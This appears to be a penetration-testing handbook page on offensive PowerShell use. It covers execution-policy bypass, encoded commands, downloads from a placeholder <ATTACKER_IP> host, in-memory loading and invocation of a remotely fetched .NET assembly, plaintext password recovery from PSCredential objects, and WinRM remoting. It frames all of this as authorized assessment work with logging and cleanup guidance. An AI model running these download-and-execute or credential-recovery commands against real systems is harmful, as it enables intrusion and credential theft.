# PowerShell Operations

PowerShell is both an administration interface and a common Windows assessment tool. Use it to inspect the host, transfer approved tooling, invoke .NET functionality, and work across authenticated remoting sessions. This page focuses on execution context and observable behavior; see [Shells & Payloads](shells-payloads.md) for shell delivery and [File Transfers](file-transfers.md) for broader transfer options.

{% hint style="warning" %}
Run these techniques only on systems covered by written authorization. Encoded commands, in-memory assembly loading, and reflection are monitored by modern endpoint controls. Record the exact command, target, timestamp, and cleanup action.
{% endhint %}

## Establish the execution context

```powershell
$PSVersionTable
$ExecutionContext.SessionState.LanguageMode
Get-ExecutionPolicy -List
whoami /all
Get-Location
```

| Check | Why it matters |
| --- | --- |
| PowerShell version | Determines available cmdlets and language behavior |
| Language mode | `ConstrainedLanguage` restricts types, methods, and dynamic code |
| Execution policy | Controls script-loading behavior by scope; it is not a security boundary |
| Token and groups | Shows integrity level and effective privileges |
| Current directory | Prevents accidental writes to sensitive paths |

Prefer a process-scoped policy when an approved unsigned script must run; it disappears with the process:

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
Get-ExecutionPolicy -List
```

Do not change machine-wide policy unless the rules of engagement explicitly permit a persistent configuration change.

## Encoded commands

`powershell.exe -EncodedCommand` expects UTF-16LE Base64. Encoding changes transport representation; it does not provide encryption or make a command invisible to logging.

Generate an encoded command on Windows:

```powershell
$command = 'Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
$encoded
```

Generate the same format from Linux:

```bash
printf %s 'Get-ComputerInfo' | iconv -t UTF-16LE | base64 -w 0
```

Decode before execution when reviewing an unknown command:

```powershell
[System.Text.Encoding]::Unicode.GetString(
    [Convert]::FromBase64String('<BASE64_COMMAND>')
)
```

Script Block Logging and process telemetry can preserve decoded content. Capture both the encoded input and decoded command in assessment evidence.

## Download files

Use a dedicated staging directory and verify integrity before execution:

```powershell
$source = 'http://<ATTACKER_IP>/<FILE>'
$destination = "$env:TEMP\<FILE>"
Invoke-WebRequest -Uri $source -OutFile $destination -UseBasicParsing
Get-FileHash -Algorithm SHA256 $destination
```

Alternative methods:

```powershell
(New-Object Net.WebClient).DownloadFile(
    'http://<ATTACKER_IP>/<FILE>',
    "$env:TEMP\<FILE>"
)

Import-Module BitsTransfer
Start-BitsTransfer -Source 'http://<ATTACKER_IP>/<FILE>' -Destination "$env:TEMP\<FILE>"
```

Use the current user's proxy configuration when required:

```powershell
$client = New-Object Net.WebClient
$client.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials
$client.DownloadFile('http://<ATTACKER_IP>/<FILE>', "$env:TEMP\<FILE>")
```

For SMB, certificate handling, and native Windows transfer utilities, use [File Transfers](file-transfers.md).

## Load scripts and modules

Load a reviewed local script into the current session:

```powershell
. "$env:TEMP\<SCRIPT>.ps1"
Import-Module "$env:TEMP\<MODULE>.psm1"
Get-Module
```

Downloading text and passing it directly to `Invoke-Expression` avoids a script file but increases risk and reduces reviewability:

```powershell
$script = (New-Object Net.WebClient).DownloadString(
    'http://<ATTACKER_IP>/<SCRIPT>.ps1'
)
# Review or hash the content before authorized execution.
$script | Set-Content "$env:TEMP\<SCRIPT>.review.txt"
```

{% hint style="info" %}
PowerShell logs may include module loads, script blocks, and command lines. In-memory execution does not mean telemetry-free execution.
{% endhint %}

## Load a .NET assembly

An approved .NET executable can be loaded from bytes without starting it from disk:

```powershell
$data = (New-Object Net.WebClient).DownloadData(
    'http://<ATTACKER_IP>/<TOOL>.exe'
)
$assembly = [System.Reflection.Assembly]::Load($data)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, (, [string[]]@('<ARGUMENT>')))
```

Before using this pattern, confirm the entry-point signature and test it in an isolated lab. Assembly loads, network retrieval, and resulting API calls remain visible to endpoint telemetry.

## Reflection and Win32 APIs

Reflection can inspect loaded assemblies and resolve managed methods at runtime:

```powershell
[AppDomain]::CurrentDomain.GetAssemblies() |
    Select-Object FullName, Location

$type = [System.Type]::GetType('System.Environment')
$type.GetMethod('GetEnvironmentVariable', [Type[]]@([string])).Invoke(
    $null,
    @('COMPUTERNAME')
)
```

Native API invocation through reflection or dynamically generated delegates is powerful but high signal. Use it only when the assessment requires validation of that control boundary; do not treat it as a generic stealth technique. Preserve the resolved module, function, arguments, and observable result in the report.

## SecureString and credentials

A `SecureString` is protected in memory and may be tied to a user or machine through DPAPI. If an authorized assessment discovers an existing `PSCredential`, retrieve only the minimum evidence required:

```powershell
$credential = Get-Variable -Name '<CREDENTIAL_VARIABLE>' -ValueOnly
$credential.UserName
$credential.GetNetworkCredential().Password
```

Do not print secrets into shared transcripts. Prefer demonstrating that a credential can be recovered, then redact it in screenshots and reports. Continue with [Credential Dumping](credential-dumping.md) for credential-specific workflows.

## Remoting

Inspect existing remoting configuration before changing it:

```powershell
Test-WSMan <TARGET>
Get-PSSessionConfiguration
```

Use supplied or recovered credentials only within scope:

```powershell
$credential = Get-Credential
$session = New-PSSession -ComputerName <TARGET> -Credential $credential
Invoke-Command -Session $session -ScriptBlock { whoami; hostname }
Remove-PSSession $session
```

See [Lateral Movement](lateral-movement.md) for WinRM constraints, authentication, and the double-hop problem.

## Evidence and cleanup

Record:

- PowerShell version, language mode, and effective identity
- Commands and hashes of transferred files
- Remote hosts and sessions created
- Files, modules, jobs, and policy scopes changed
- Endpoint or SIEM alerts generated during validation

Clean up only artifacts created by the assessment:

```powershell
Remove-PSSession -Session $session -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\<FILE>" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\<SCRIPT>.review.txt" -Force -ErrorAction SilentlyContinue
```

Verify that temporary files and sessions are gone, and document any artifact that cannot be removed safely.

## Related

- [Shells & Payloads](shells-payloads.md)
- [File Transfers](file-transfers.md)
- [Windows Privilege Escalation](windows-privesc-methodology.md)
- [Credential Dumping](credential-dumping.md)
- [Lateral Movement](lateral-movement.md)
